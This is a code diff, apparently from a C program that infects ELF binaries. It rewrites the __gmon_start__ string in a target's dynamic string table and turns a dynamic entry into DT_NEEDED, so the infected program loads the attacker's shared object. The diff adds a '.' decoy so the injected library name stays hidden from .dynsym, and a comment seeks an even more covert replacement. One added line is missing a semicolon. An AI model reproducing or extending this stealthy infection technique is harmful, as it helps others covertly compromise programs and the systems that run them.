@@ -54,10 +54,13 @@ void entry(){ // need to find a portable solution for parameter passing here...c
   }
   
   // replace __gmon_start__ with SO name
-  char* str = dyn_str + 1;
+  char* str = dyn_str + 1; // 1st entry is null, skip over
   while(1){ // so far it seems that gcc, clang and even tcc provide the __gmon_start__ string....may suffice to only use it, TBD
     if(!strcmp(str, "__gmon_start__")){
-      strcpy(str, self);
+      str[0] = '.';
+      str[1] = '\0'
+      // now '.' will show up in .dynsym instead of soname (maybe find even more covert string replacement?)
+      strcpy(&str[2], self);
       break;
     }
     str += strlen(str) + 1;
@@ -78,13 +81,13 @@ void entry(){ // need to find a portable solution for parameter passing here...c
     // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
     memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
     dynamic[needed_offset].d_tag = DT_NEEDED;
-    dynamic[needed_offset].d_un.d_val = str - dyn_str;
+    dynamic[needed_offset].d_un.d_val = &str[2] - dyn_str;
   }else{
     // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
     for(int i = 0; i < dyn_cnt; ++i){
       if(dynamic->d_tag == DT_DEBUG){
 	dynamic->d_tag = DT_NEEDED;
-	dynamic->d_un.d_val = str - dyn_str;
+	dynamic->d_un.d_val = &str[2] - dyn_str;
 	break;
       }
       dynamic++;
